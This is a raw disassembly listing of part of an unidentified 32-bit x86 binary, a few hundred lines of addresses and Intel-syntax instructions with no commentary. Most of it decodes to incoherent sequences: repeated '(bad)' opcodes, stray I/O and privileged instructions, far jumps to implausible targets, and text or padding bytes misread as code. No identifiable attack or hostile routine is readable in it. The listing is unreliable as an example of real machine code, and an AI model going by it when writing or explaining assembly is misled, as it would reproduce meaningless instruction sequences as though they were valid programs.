  4171e5:	mov    eax,DWORD PTR [eax]
  4171e7:	add    BYTE PTR [eax],al
  4171e9:	outs   dx,BYTE PTR ds:[esi]
  4171ea:	xchg   edx,eax
  4171eb:	add    BYTE PTR [eax],al
  4171ed:	shl    edx,0x0
  4171f0:	add    BYTE PTR [eax],al
  4171f2:	call   0xe92a5adf
  4171f7:	call   0xc2a5ae4
  4171fc:	cmc    
  4171fd:	push   ebp
  4171fe:	inc    edi
  4171ff:	ret    0xd34c
  417202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417203:	xor    al,0x99
  417205:	jne    0x4171ba
  417207:	out    0xba,eax
  417209:	stos   DWORD PTR es:[edi],eax
  41720a:	jne    0x417212
  41720c:	push   0xa7c20d7d
  417211:	lods   al,BYTE PTR ds:[esi]
  417212:	push   eax
	...
  41721b:	add    BYTE PTR [eax],al
  41721d:	add    ah,bh
  41721f:	mov    bl,0x3f
  417221:	pop    ebx
  417222:	add    BYTE PTR [eax],al
  417224:	add    BYTE PTR [edi-0x59],ah
  417227:	cmp    ebx,DWORD PTR [edx+0x63a4f9e9]
  41722d:	xchg   BYTE PTR [edx-0x5a],dl
  417230:	mov    cl,0x40
  417232:	cmp    ebp,DWORD PTR [ebp+0xd225bb6]
  417238:	push   esi
  417239:	xchg   ebp,eax
  41723a:	das    
  41723b:	mov    ch,0xb2
  41723d:	jbe    0x4171de
  41723f:	(bad)  
  417241:	test   ecx,esp
  417243:	mov    edi,0x70da6f
  417248:	add    BYTE PTR [edx-0x40],bh
  41724b:	add    BYTE PTR [eax],al
  41724d:	dec    esp
  41724e:	stos   DWORD PTR es:[edi],eax
  41724f:	xchg   ebx,eax
  417250:	add    BYTE PTR [ebx-0x3e3d52a5],cl
  417256:	add    DWORD PTR [eax-0x10c17777],eax
  41725c:	fldcw  WORD PTR [ecx+ecx*8-0x55f2961d]
  417263:	sbb    esp,ebx
  417265:	sbb    eax,0xe5d18eaa
  41726a:	mov    ecx,DWORD PTR [ebx+0x40f13a8b]
  417270:	outs   dx,BYTE PTR ds:[esi]
  417271:	(bad)  [bp+si]
  417274:	in     al,dx
  417275:	xchg   DWORD PTR [edi],esp
  417277:	dec    esp
  417278:	jp     0x4172eb
  41727a:	movd   ebx,mm6
  41727d:	repnz mov WORD PTR [eax],fs
  417280:	dec    edx
  417281:	jns    0x4172f0
  417283:	fcom   QWORD PTR [ebx-0x690569fa]
  417289:	xor    BYTE PTR [ebx+0xedfc48b],cl
  41728f:	mov    ecx,DWORD PTR [ebx-0x17171775]
  417295:	call   0xe92a5b82
  41729a:	call   0xb1b365
	...
  4172a7:	(bad)  
  4172a8:	(bad)  
  4172a9:	sti    
  4172aa:	int    0xcc
  4172ac:	xlat   BYTE PTR ds:[ebx]
  4172ad:	jne    0x417249
  4172af:	pop    es
  4172b0:	cli    
  4172b1:	subps  xmm7,XMMWORD PTR [ebp+0x246215a0]
  4172b8:	dec    ebp
  4172b9:	add    esp,esp
  4172bb:	ins    DWORD PTR es:[edi],dx
  4172bc:	push   ss
  4172bd:	add    al,0x6c
  4172bf:	cmp    eax,0x86ffff19
  4172c4:	popa   
  4172c5:	(bad)  
  4172c6:	(bad)  
  4172c7:	jmp    0x57a9:0x4cffff4a
  4172ce:	or     eax,0x399c7c84
  4172d3:	mov    edx,DWORD PTR [ecx-0x787447a0]
  4172d9:	(bad)  
  4172da:	pop    edi
  4172db:	scas   al,BYTE PTR es:[edi]
  4172dc:	call   DWORD PTR [ebx]
  4172de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172df:	push   0xffffff99
  4172e1:	(bad)  
  4172e2:	jp     0x4172e3
  4172e4:	add    bh,ch
  4172e6:	push   es
  4172e7:	stos   BYTE PTR es:[edi],al
  4172e8:	add    BYTE PTR ss:[eax],al
  4172eb:	add    BYTE PTR [edx-0x2f1734f4],dl
  4172f1:	dec    eax
  4172f2:	sub    BYTE PTR [ebx],bl
  4172f4:	cld    
  4172f5:	mov    edi,0xbbc8675c
  4172fa:	cld    
  4172fb:	lock je 0x417362
  4172fe:	shl    dh,cl
  417300:	push   ebp
  417301:	imul   ecx,DWORD PTR [esi-0x70],0xc893abbc
  417308:	popa   
  417309:	push   esi
  41730a:	sbb    al,0xc3
  41730c:	imul   esp,DWORD PTR [ebx+0x1500002e],0xfffffff3
  417313:	add    BYTE PTR [eax],al
  417315:	add    BYTE PTR [ebx-0x74747475],cl
  41731b:	mov    ecx,DWORD PTR [ebx+0x31f38b8b]
  417321:	inc    esp
	...
  41732a:	add    BYTE PTR [ebx+0x1cde7c83],al
  417330:	loopne 0x41736c
  417332:	cmp    esi,DWORD PTR [esi]
  417334:	js     0x417303
  417336:	nop
  417337:	and    BYTE PTR [esi],cl
  417339:	inc    ecx
  41733a:	add    DWORD PTR [edx],eax
  41733c:	je     0x4173b6
  41733e:	in     eax,dx
  41733f:	into   
  417340:	inc    esp
  417341:	(bad)  
  417342:	popf   
  417343:	xchg   esi,eax
  417344:	fiadd  WORD PTR [ebx-0x5f18097d]
  41734a:	leave  
  41734b:	std    
  41734c:	fsub   st(2),st
  41734e:	test   esp,edx
  417350:	cmp    DWORD PTR [ebx-0x1d6d2bcd],0xffffffef
  417357:	sbb    DWORD PTR [edx],eax
  417359:	in     eax,0x31
  41735b:	fwait
  41735c:	push   es
  41735d:	aam    0xfa
  41735f:	jmp    0x8383:0xe31a5c57
  417366:	std    
  417367:	mov    edx,0xdf83830a
  41736c:	int    0xa6
  41736e:	add    DWORD PTR [eax],0x29
  417371:	mov    cs,WORD PTR [edi+0x5e]
  417374:	sti    
  417375:	xor    eax,0x782e83d7
  41737a:	inc    edx
  41737b:	mov    esi,0x60cc566f
  417380:	das    
  417381:	add    eax,0xb649e8f8
  417386:	pusha  
  417387:	mov    edx,0xee000000
  41738c:	sub    DWORD PTR [eax],eax
  41738e:	add    BYTE PTR [edx+0x38],dl
  417391:	add    BYTE PTR [eax],al
  417393:	add    BYTE PTR [esp+eax*1],al
  417396:	add    al,0x4
  417398:	add    al,0x4
  41739a:	add    al,0x4
  41739c:	add    al,0x6
  41739e:	stc    
  41739f:	mov    ebp,0xe736d277
  4173a4:	out    0xe6,eax
  4173a6:	mov    esp,0xca4ee6b0
  4173ab:	or     DWORD PTR [esi+ebp*2],ecx
  4173ae:	jns    0x417373
  4173b0:	loopne 0x4173a2
  4173b2:	pop    ecx
  4173b3:	mov    esi,edi
  4173b5:	or     BYTE PTR [eax],cl
  4173b7:	or     BYTE PTR [eax],cl
  4173b9:	or     BYTE PTR [eax],cl
  4173bb:	or     BYTE PTR [eax],cl
  4173bd:	or     BYTE PTR [ebp-0x3a8dce73],cl
  4173c3:	pop    ecx
  4173c4:	lea    ecx,[ebp-0x3c451557]
  4173ca:	test   DWORD PTR [ecx],ebx
  4173cc:	outs   dx,BYTE PTR ds:[esi]
  4173cd:	or     ah,BYTE PTR [edi+0x173b9677]
  4173d3:	dec    esi
  4173d4:	es add ecx,ecx
  4173d7:	dec    ebp
  4173d8:	enter  0x2b8,0xcf
  4173dc:	dec    ebx
  4173dd:	pop    esp
  4173de:	cwde   
  4173df:	fldenv [esi]
  4173e1:	or     bh,BYTE PTR [edx+edi*1+0x45]
  4173e5:	sbb    al,0x63
  4173e7:	jbe    0x417423
  4173e9:	lea    ecx,[ebp-0x72720e3e]
  4173ef:	push   es
  4173f0:	outs   dx,BYTE PTR ds:[esi]
  4173f1:	in     al,dx
  4173f2:	(bad)  
  4173f3:	jmp    DWORD PTR [edi]
  4173f5:	sbb    dl,cl
  4173f7:	in     al,0x9a
  4173f9:	xchg   ebx,eax
  4173fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173fc:	dec    ebp
  4173fd:	imul   edi,DWORD PTR [ebx],0xffffff8d
  417400:	lahf   
  417401:	inc    edx
  417402:	dec    edx
  417403:	dec    si
  417405:	jb     0x4173ea
  417407:	iret   
  417408:	add    al,0xa5
  41740a:	bound  esp,QWORD PTR [edx-0x1]
  41740d:	(bad)  
  41740e:	dec    DWORD PTR [eax-0x4f]
  417411:	loopne 0x41743f
  417413:	retf   0xeff1
  417416:	fst    st(0)
  417418:	xor    BYTE PTR [edx],ah
  41741a:	inc    edi
  41741b:	or     al,cl
  41741d:	ds aaa 
  41741f:	out    0xe0,al
  417421:	mov    fs,ecx
  417423:	scas   eax,DWORD PTR es:[edi]
  417424:	(bad)  
  417425:	retf   
  417426:	gs (bad) 
  417428:	std    
  417429:	out    0xa7,eax
  41742b:	pusha  
  41742c:	(bad)  
  41742d:	call   DWORD PTR [edx]
  41742f:	retf   
  417430:	sar    bh,cl
  417432:	(bad)  
  417433:	jmp    FWORD PTR [edx+0x6a]
  417436:	push   0x6a
  417438:	push   0x6a
  41743a:	push   0x6a
  41743c:	push   0xffffff83
  41743e:	sbb    cl,BYTE PTR [eax]
  417440:	push   0x6a
  417442:	push   0x6a
  417444:	push   0x6a
  417446:	push   0x6a
  417448:	push   0x33
  41744a:	xor    eax,DWORD PTR [eax+0x73]
  41744d:	xor    BYTE PTR [ebp+0x8e9f78e],0xfa
  417454:	fwait
  417455:	add    dl,cl
  417457:	shr    BYTE PTR [eax+0x16],cl
  41745a:	sub    BYTE PTR [ebp-0x65073342],ah
  417460:	dec    ebp
  417461:	mov    eax,ecx
  417463:	xor    esi,DWORD PTR [ebx]
  417465:	and    DWORD PTR [ebx+esi*1],eax
  417468:	xor    eax,DWORD PTR [ebp-0x28cccc85]
  41746e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41746f:	adc    eax,0xd0e03535
  417474:	aaa    
  417475:	bound  edx,QWORD PTR [ebp+ebx*8+0x7f]
  417479:	dec    ebx
  41747a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41747b:	mov    eax,0xf08054f3
  417480:	sub    BYTE PTR ss:[eiz*1+0x738b338a],cl
  417488:	scas   eax,DWORD PTR es:[edi]
  417489:	xchg   esp,eax
  41748a:	mov    ds:0xb08b8b8b,al
  41748f:	repnz daa 
  417491:	dec    esi
  417492:	adc    edx,ebx
  417494:	mov    bl,0x51
  417496:	int    0x19
  417498:	mov    ebx,DWORD PTR [eax-0x40]
  41749b:	inc    ecx
  41749c:	in     al,dx
  41749d:	retf   0x566a
  4174a0:	fstp   QWORD PTR [ebp-0x4bc7ff7a]
  4174a6:	aaa    
  4174a7:	scas   eax,DWORD PTR es:[edi]
  4174a8:	mov    WORD PTR [edi],cs
  4174aa:	dec    ebx
  4174ab:	lea    esi,[edi]
  4174ad:	jecxz  0x4174a2
  4174af:	mov    al,0x34
  4174b1:	mov    ecx,DWORD PTR [ebx-0x74745eda]
  4174b7:	mov    ecx,DWORD PTR [ebp-0x72727273]
  4174bd:	lea    ecx,[ebp-0x39277273]
  4174c3:	jns    0x4174c4
  4174c5:	(bad)  
  4174c6:	(bad)  
  4174c7:	(bad)  
  4174c8:	(bad)  
  4174c9:	(bad)  
  4174ca:	(bad)  
  4174cb:	(bad)  
  4174cc:	push   DWORD PTR [ebp+0x75]
  4174cf:	sub    DWORD PTR [esi-0x49bcefe4],ebx
  4174d5:	xor    esi,DWORD PTR [edi-0x7a10b2d6]
  4174db:	fiadd  WORD PTR [eax+eiz*1+0x65]
  4174df:	jae    0x41754e
  4174e1:	ins    DWORD PTR es:[edi],dx
  4174e2:	ds jbe 0x417552
  4174e5:	imul   esp,DWORD PTR [edx+0x6e],0x69722e69
  4174ec:	imul   esp,DWORD PTR [edx],0x4145740a
  4174f2:	and    BYTE PTR ds:0x3e762e2e,cl
  4174f8:	imul   esp,DWORD PTR [ebx+0x79],0x623c6e20
  4174ff:	outs   dx,BYTE PTR ds:[esi]
  417500:	outs   dx,DWORD PTR ds:[esi]
  417501:	cs jae 0x417566
  417504:	gs imul ebp,DWORD PTR cs:[esi+0x63],0x6c654566
  41750d:	jb     0x417575
  41750f:	je     0x41757e
  417511:	sub    al,0x63
  417513:	or     ah,BYTE PTR [eax]
  417515:	and    BYTE PTR [ebp+0x74],ah
  417518:	outs   dx,DWORD PTR ds:[esi]
  417519:	ins    DWORD PTR es:[edi],dx
  41751a:	cs ins DWORD PTR es:[edi],dx
  41751c:	ins    DWORD PTR es:[edi],dx
  41751d:	push   ebx
  41751e:	je     0x417593
  417520:	and    dl,BYTE PTR [edi+0xa]
  417523:	push   ebx
  417524:	ins    DWORD PTR es:[edi],dx
  417525:	jne    0x417597
  417527:	and    BYTE PTR [eax],ah
  417529:	and    BYTE PTR [ebx+0x3d],ah
  41752c:	and    BYTE PTR ds:0xe26c0a65,cl
  417532:	push   ebp
  417533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417534:	cmp    eax,0x7446f392
  417539:	arpl   WORD PTR [edx+0x27757585],si
  41753f:	retf   
  417540:	mov    ah,0xc9
  417542:	hlt    
  417543:	js     0x4175bc
  417545:	and    BYTE PTR [edi-0x61de8a17],0xb9
  41754c:	rcr    BYTE PTR [esp+ebx*8],0xf0
  417550:	pop    eax
  417551:	loope  0x4174fc
  417553:	cmp    ecx,edi
  417555:	in     al,0xe7
  417557:	icebp  
  417558:	(bad)  
  417559:	xchg   edx,esp
  41755b:	jne    0x4175d2
  41755d:	lods   al,BYTE PTR ds:[esi]
  41755e:	mov    al,ds:0x27575ff
  417563:	xchg   esi,eax
  417564:	inc    eax
  417565:	jne    0x417567
  417567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417568:	add    BYTE PTR [eax],ch
  41756a:	inc    edi
  41756b:	mov    ds:0x27f0eaf7,al
  417570:	les    eax,FWORD PTR [edi-0x33]
  417573:	dec    ecx
  417574:	in     eax,dx
  417575:	inc    esp
  417576:	dec    esp
  417577:	mov    ebx,0x791b3f9b
  41757c:	and    al,0x24
  41757e:	xchg   ecx,eax
  41757f:	add    BYTE PTR [eax],al
  417581:	add    BYTE PTR [esi-0x1d],ah
  417584:	add    BYTE PTR [eax],al
  417586:	sar    DWORD PTR [edi+0x0],cl
  417589:	add    BYTE PTR [eax],al
  41758b:	lea    ecx,[ebp-0x72727273]
  417591:	lea    ecx,[ebp-0xcf9e373]
  417597:	pop    ebp
  417598:	jns    0x4175af
  41759a:	adc    al,0x46
  41759c:	mov    BYTE PTR [esi+0x19],bl
  41759f:	push   es
  4175a0:	sub    esi,DWORD PTR [ebp+0x72]
  4175a3:	fld    DWORD PTR [ebx+0x67]
  4175a6:	sub    DWORD PTR [ebp+0x7ba70276],esp
  4175ac:	mov    DWORD PTR [ecx-0x76767677],ecx
  4175b2:	mov    DWORD PTR [ecx+0x14242489],ecx
  4175b8:	test   ch,ah
  4175ba:	pop    ebx
  4175bb:	and    al,0x24
  4175bd:	and    BYTE PTR [eax+ebx*1],0xdf
  4175c1:	in     al,0xd
  4175c3:	jb     0x4175ae
  4175c5:	lods   al,BYTE PTR ds:[esi]
  4175c6:	xchg   BYTE PTR [ebp-0x13],ch
  4175c9:	and    al,0x19
  4175cb:	out    dx,eax
  4175cc:	lods   eax,DWORD PTR ds:[esi]
  4175cd:	jl     0x41759c
  4175cf:	je     0x417571
  4175d1:	in     eax,0x96
  4175d3:	add    eax,DWORD PTR [ecx-0x70]
  4175d6:	mov    eax,0xf09ea747
  4175db:	retf   
  4175dc:	icebp  
  4175dd:	push   ecx
  4175de:	add    al,0x7b
  4175e0:	and    al,0x24
  4175e2:	jo     0x417620
  4175e4:	and    al,0x24
  4175e6:	pop    ecx
  4175e7:	inc    edi
  4175e8:	fisub  DWORD PTR [eax+eax*1]
  4175eb:	mov    al,ds:0x49d34935
  4175f0:	(bad)
  4175f3:	ds jbe 0x4175e0
  4175f6:	jmp    0x23539cfa
  4175fb:	loopne 0x4175ca
  4175fd:	aam    0x67
  4175ff:	jge    0x417653
  417601:	jmp    0x5767:0x81
  417608:	jo     0x41765f
  41760a:	sub    eax,0x4d8aaa38
  41760f:	fcomp  st(3)
  417611:	ss pop edi
  417613:	mov    eax,0x8b5344b1
  417618:	xchg   ecx,eax
  417619:	sub    al,0xce
  41761b:	stos   DWORD PTR es:[edi],eax
  41761c:	das    
  41761d:	int3   
  41761e:	lahf   
  41761f:	pop    ds
  417620:	aad    0x2a
  417622:	lds    eax,FWORD PTR [eax]
  417624:	add    BYTE PTR [ecx],ch
  417626:	push   esi
  417627:	stc    
  417628:	add    BYTE PTR [eax],al
  41762a:	add    ah,cl
  41762c:	int3   
  41762d:	int3   
  41762e:	int3   
  41762f:	int3   
  417630:	int3   
  417631:	int3   
  417632:	int3   
  417633:	int3   
  417634:	mov    DWORD PTR [ebx],ebx
  417636:	iret   
  417637:	add    al,0x4
  417639:	add    al,0x4
  41763b:	add    al,0x4
  41763d:	add    al,0x4
  41763f:	add    al,0xff
  417641:	jmp    eax
  417643:	mov    WORD PTR [ebx+edi*8-0x6efc1184],?
  41764a:	(bad)  
  41764b:	dec    edi
  41764c:	(bad)  
  41764d:	and    al,0x1c
  41764f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417650:	jb     0x417645
  417652:	(bad)  
  417653:	mov    al,0x15
  417655:	das    
  417656:	jge    0x4175f0
  417658:	xchg   ebx,eax
  417659:	dec    esp
  41765a:	(bad)  
  41765b:	dec    DWORD PTR [ecx-0x65]
  41765e:	(bad)  
  41765f:	dec    DWORD PTR [ebp-0x3a0000c1]
  417665:	jne    0x41761c
  417667:	pop    esi
  417668:	inc    edi
  417669:	test   ebp,eax
  41766b:	inc    ecx
  41766c:	pop    ds
  41766d:	(bad)  
  41766e:	xchg   ecx,eax
  41766f:	jno    0x4176a0
  417671:	ds xor eax,0xa95013d2
  417677:	or     DWORD PTR [ecx+0x4a],ecx
  41767a:	sub    al,0x94
  41767c:	inc    DWORD PTR [eax]
  41767e:	shl    BYTE PTR [esi-0x44],0x82
  417682:	add    BYTE PTR [eax],al
  417684:	add    cl,ch
  417686:	add    al,bl
  417688:	in     eax,dx
  417689:	pusha  
  41768a:	scas   eax,DWORD PTR es:[edi]
  41768b:	push   ebx
  41768c:	pop    esi
  41768d:	lods   al,BYTE PTR ds:[esi]
  41768e:	sahf   
  41768f:	mov    eax,ds
  417691:	sub    DWORD PTR [esi-0x6753b125],ebp
  417697:	int    0x44
  417699:	enter  0x3eb1,0xcf
  41769d:	jne    0x417649
  41769f:	dec    esi
  4176a0:	push   ecx
  4176a1:	es add BYTE PTR fs:[edx],0x43
  4176a6:	mov    edx,0x27000045
  4176ab:	pop    edi
  4176ac:	add    BYTE PTR [eax],al
  4176ae:	add    BYTE PTR [ebp-0x72727273],cl
  4176b4:	lea    ecx,[ebp-0x7eb77273]
  4176ba:	and    eax,0x0
  4176bf:	add    BYTE PTR [eax],al
  4176c1:	add    BYTE PTR [eax],al
  4176c3:	add    BYTE PTR [eax],al
  4176c5:	add    BYTE PTR [edi],dh
  4176c7:	(bad)  
  4176c8:	mov    dh,0x85
  4176ca:	lahf   
  4176cb:	mov    ah,0xc7
  4176cd:	scas   al,BYTE PTR es:[edi]
  4176ce:	cmp    edx,eax
  4176d0:	loope  0x41768d
  4176d2:	push   0xffffff8b
  4176d4:	jae    0x417712
  4176d6:	fimul  DWORD PTR [edi+0x35293b3b]
  4176dc:	mov    BYTE PTR [edx-0x642d0000],0xec
  4176e3:	pop    edi
  4176e4:	retf   
  4176e5:	aaa    
  4176e6:	or     BYTE PTR [ecx],ch
  4176e8:	test   eax,0xf7b00125
  4176ed:	jb     0x41769b
  4176ef:	push   eax
  4176f0:	sahf   
  4176f1:	scas   eax,DWORD PTR es:[edi]
  4176f2:	sbb    al,0x60
  4176f4:	fsubr  QWORD PTR [eax-0x3bbe461]
  4176fa:	fisubr WORD PTR [edx]
  4176fc:	imul   eax,DWORD PTR [eax],0x0
  4176ff:	cmp    edi,DWORD PTR [edi]
  417701:	stc    
  417702:	add    BYTE PTR [eax],al
  417704:	push   edx
  417705:	xor    al,BYTE PTR gs:[eax]
  417708:	or     bh,ch
  41770a:	sbb    ah,BYTE PTR [esi]
  41770c:	pop    es
  41770d:	inc    ebx
  41770e:	in     eax,dx
  41770f:	aas    
  417710:	(bad)  
  417712:	mov    ecx,0x4d1cbc70
  417717:	jmp    0xd5ea4d04
  41771c:	jp     0x4176fd
  41771e:	xchg   ebx,eax
  41771f:	pop    ebx
  417720:	invd   
  417722:	or     BYTE PTR [eax],cl
  417724:	mov    dl,0xd5
  417726:	or     BYTE PTR [eax],cl
  417728:	push   0x80808ab
  41772d:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  417733:	test   DWORD PTR [ebp+0x1dad0b85],eax
  417739:	repnz mov edi,0x10f30be
  41773f:	and    DWORD PTR [esi-0x3a],0x7ed48958
  417746:	not    BYTE PTR [ebp-0x7b7a92b3]
  41774c:	mov    ds:0xfffffff6,al
  417751:	(bad)  
  417752:	(bad)  
  417753:	(bad)  
  417754:	(bad)  
  417755:	(bad)  
  417756:	(bad)  
  417757:	call   0x8cb9f044
  41775c:	push   edi
  41775d:	call   0xd8275b4a
  417762:	rcr    DWORD PTR [ecx-0x25b68ca5],cl
  417768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417769:	loopne 0x417753
  41776b:	inc    edx
  41776c:	(bad)  
  41776d:	mov    eax,ds:0x904a59b9
  417772:	jmp    0x853f5255
  417777:	mov    dh,al
  417779:	mov    dh,0xa1
  41777b:	dec    edi
  41777c:	sub    al,0x4b
  41777e:	popf   
  41777f:	or     edi,DWORD PTR [edx+edx*1]
  417782:	call   0xe8b85b6f
  417787:	call   0xe901d4be
  41778c:	add    BYTE PTR [edx+0x5],ch
  41778f:	push   eax
  417790:	jl     0x41773b
  417792:	popa   
  417793:	nop
  417794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417795:	ss fucom st(0)
  417798:	shl    DWORD PTR [ecx+0x79b4cdcd],cl
  41779e:	daa    
  41779f:	push   ebp
  4177a0:	enter  0xaa21,0xc5
  4177a4:	imul   ecx,DWORD PTR [ebp+0x22],0x7257694d
  4177ab:	outs   dx,BYTE PTR ds:[esi]
  4177ac:	outs   dx,DWORD PTR ds:[esi]
  4177ad:	push   ebx
  4177ae:	jae    0x417803
  4177b0:	and    BYTE PTR cs:[edi+0x72],ch
  4177b4:	or     ah,BYTE PTR [eax]
  4177b6:	ins    DWORD PTR es:[edi],dx
  4177b7:	bound  esi,QWORD PTR [ebp+0x73]
  4177ba:	and    BYTE PTR cs:[ecx],dh
  4177bd:	jo     0x4177fd
  4177bf:	push   ebx
  4177c0:	jne    0x417823
  4177c2:	inc    esp
  4177c3:	cs cs or eax,0x636f6365
  4177ca:	jb     0x417839
  4177cc:	imul   ebp,DWORD PTR [ebp+0x72],0x3e6d6f73
  4177d3:	arpl   WORD PTR gs:[ebx+0x4d],dx
  4177d7:	outs   dx,DWORD PTR cs:[esi]
  4177d9:	cs push edx
  4177db:	ins    DWORD PTR es:[edi],dx
  4177dc:	and    BYTE PTR ds:[ecx+0x76],ch
  4177e0:	imul   esp,DWORD PTR [eax],0x3e2e723c
  4177e6:	je     0x41784d
  4177e8:	cs cs jae 0x41783f
  4177ec:	and    BYTE PTR [esi+0x3c],ah
  4177ef:	outs   dx,DWORD PTR ds:[esi]
  4177f0:	jb     0x417835
  4177f2:	arpl   WORD PTR [ebx+0x65],bx
  4177f5:	jbe    0x417860
  4177f7:	jbe    0x41785d
  4177f9:	cs ins DWORD PTR es:[edi],dx
  4177fb:	jb     0x417873
  4177fd:	and    BYTE PTR [edi+0x68],ch
  417800:	bound  esp,QWORD PTR [edi+0x20]
  417803:	outs   dx,DWORD PTR ds:[esi]
  417804:	arpl   WORD PTR [edi+0x47],bp
  417807:	and    BYTE PTR gs:[edi+0x20],ch
  41780b:	das    
  41780c:	and    al,BYTE PTR [ecx+0x65]
  41780f:	ins    DWORD PTR es:[edi],dx
  417810:	and    BYTE PTR [edx+0x20],dh
  417813:	push   eax
  417814:	imul   eax,DWORD PTR [ecx+0x6e],0x53667320
  41781b:	sub    DWORD PTR [ecx-0x26],ebp
  41781e:	add    BYTE PTR [eax],al
  417820:	add    BYTE PTR [ebp-0x3a8c6e7d],bl
  417826:	test   eax,0x351e9104
  41782b:	into   
  41782c:	add    al,0x29
  41782e:	jp     0x4177d6
  417830:	cwde   
  417831:	mov    ch,BYTE PTR [eax]
  417833:	(bad)  
  417835:	idiv   DWORD PTR [ecx+eax*1+0x6e]
  417839:	pop    ebx
  41783a:	jmp    0x7900:0x442993
  417841:	pushf  
  417842:	in     al,dx
	...
  41784f:	inc    ebx
  417850:	xor    DWORD PTR [eax+0x75],ebp
  417853:	jne    0x4178ca
  417855:	jne    0x4178cc
  417857:	jne    0x4178ce
  417859:	jne    0x4178d0
  41785b:	add    BYTE PTR [eax],al
  41785d:	push   esp
  41785e:	das    
  41785f:	mov    esp,0x50680ed7
  417864:	mov    edx,0x7f84a7f5
  417869:	sar    BYTE PTR [ebp*4-0x3cc024d5],0x33
  417871:	bound  edx,QWORD PTR [eax-0x2b]
  417874:	sub    eax,0x23870000
  417879:	add    BYTE PTR [eax],al
  41787b:	mov    ch,ah
  41787d:	add    BYTE PTR [eax],al
  41787f:	or     bl,BYTE PTR [edx]
  417881:	jmp    0xbe20:0x3d4c4390
  417888:	retf   0xc676
  41788b:	mov    al,ds:0xf784d76b
  417890:	scas   eax,DWORD PTR es:[edi]
  417891:	test   al,0xdd
  417893:	call   0x1238ec7
  417898:	jne    0x417908
  41789a:	lods   al,BYTE PTR ds:[esi]
  41789b:	or     eax,0x75757556
  4178a0:	sub    edi,esp
  4178a2:	fisttp QWORD PTR [edx]
  4178a4:	inc    ebx
  4178a5:	call   0x34319e40
  4178aa:	or     eax,0xd566b238
  4178af:	mov    dl,BYTE PTR [edi-0x37add1da]
  4178b5:	sbb    al,0xb3
  4178b7:	inc    eax
  4178b8:	out    dx,al
  4178b9:	sar    DWORD PTR [esi],cl
  4178bb:	sbb    bl,dh
  4178bd:	push   es
  4178be:	and    DWORD PTR [ecx-0x3b],esp
  4178c1:	add    BYTE PTR [ebx-0x436f8a8b],0x75
  4178c8:	jne    0x41793f
  4178ca:	and    al,0x24
  4178cc:	and    al,0x24
  4178ce:	and    al,0x24
  4178d0:	and    al,0x24
  4178d2:	and    al,0xb4
  4178d4:	pop    edi
  4178d5:	data16 je 0x41794c
  4178d8:	je     0x41794e
  4178da:	je     0x417950
  4178dc:	je     0x417952
  4178de:	je     0x417925
  4178e0:	inc    ebp
  4178e1:	loop   0x417917
  4178e3:	stos   BYTE PTR es:[edi],al
  4178e4:	add    DWORD PTR [edi-0x3041a756],0x5454dfc9
  4178ee:	mov    ah,0x64
  4178f0:	mov    gs,WORD PTR [ecx+ecx*4-0xe]
  4178f4:	(bad)  ds:0x45db8b5c
  4178fa:	inc    ebp
  4178fb:	idiv   DWORD PTR [edx]
  4178fd:	das    
  4178fe:	add    dl,BYTE PTR [edi-0x52]
  417901:	sbb    BYTE PTR [eax+0x4f],dl
  417904:	dec    ebx
  417905:	xchg   ebp,eax
  417906:	in     eax,dx
  417907:	mov    esp,DWORD PTR [ecx+eiz*8+0x1f0c887]
  41790e:	mov    esp,0x7f10920a
  417913:	lahf   
  417914:	aam    0x57
  417916:	call   0x6186bed4
  41791b:	or     al,0xc6
  41791d:	inc    ebp
  41791e:	inc    ebp
  41791f:	daa    
  417920:	add    ebp,DWORD PTR [ebp+eax*2+0x0]
  417924:	jge    0x417957
  417926:	add    dh,BYTE PTR [edx+0x39bdd78a]
  41792c:	sub    eax,0xd422b9a
  417931:	(bad)  
  417933:	mov    dh,0xdb
  417935:	(bad)  
  417936:	mov    edx,0x1ed98865
  41793b:	retf   0x0
  41793e:	add    BYTE PTR [ecx],dl
  417940:	dec    eax
  417941:	add    BYTE PTR [eax],al
  417943:	test   al,0x6d
  417945:	add    BYTE PTR [eax],al
  417947:	add    BYTE PTR [ebx-0x74747475],cl
  41794d:	mov    ecx,DWORD PTR [ebx-0x76d57475]
  417953:	je     0x4179a2
  417955:	jb     0x4179c7
  417957:	stc    
  417958:	mov    al,ds:0xd440455f
  41795d:	mov    ebx,0xf724dba3
  417962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417963:	cdq    
  417964:	mov    al,ds:0xafb4ffd1
  417969:	(bad)  
  41796a:	(bad)  
  41796b:	(bad)  
  41796c:	(bad)  
  41796d:	(bad)  
  41796e:	(bad)  
  41796f:	(bad)  
  417970:	(bad)  
  417971:	dec    DWORD PTR [ebx+0x119b8f8b]
  417977:	or     cl,BYTE PTR [ebx+0x6425478b]
  41797d:	pusha  
  41797e:	out    dx,eax
  41797f:	lahf   
  417980:	and    al,0x92
  417982:	stos   DWORD PTR es:[edi],eax
  417983:	jae    0x4179f8
  417985:	or     al,bh
  417987:	ss xchg edx,eax
  417989:	sbb    ebx,DWORD PTR [ebp+0x2c7f8b00]
  41798f:	aam    0xff
  417991:	xor    eax,0x6546cf70
  417996:	sub    dl,BYTE PTR ds:0xdcbdc340
  41799c:	iret   
  41799d:	mov    ecx,DWORD PTR [ebx-0x74747d26]
  4179a3:	mov    fs,WORD PTR [edi]
  4179a5:	lahf   
  4179a6:	mov    eax,DWORD PTR [eax]
  4179a8:	mov    cl,0xc1
  4179aa:	mov    ecx,0x7f33a203
  4179af:	pop    es
  4179b0:	outs   dx,BYTE PTR ds:[esi]
  4179b1:	(bad)  
  4179b2:	iret   
  4179b3:	fcmove st,st(4)
  4179b5:	cli    
  4179b6:	cld    
  4179b7:	jmp    0x54c633a9
  4179bc:	shl    BYTE PTR [esi+ebx*4],1
  4179bf:	into   
  4179c0:	add    BYTE PTR [eax],al
  4179c2:	add    BYTE PTR [ebp+0x11],bl
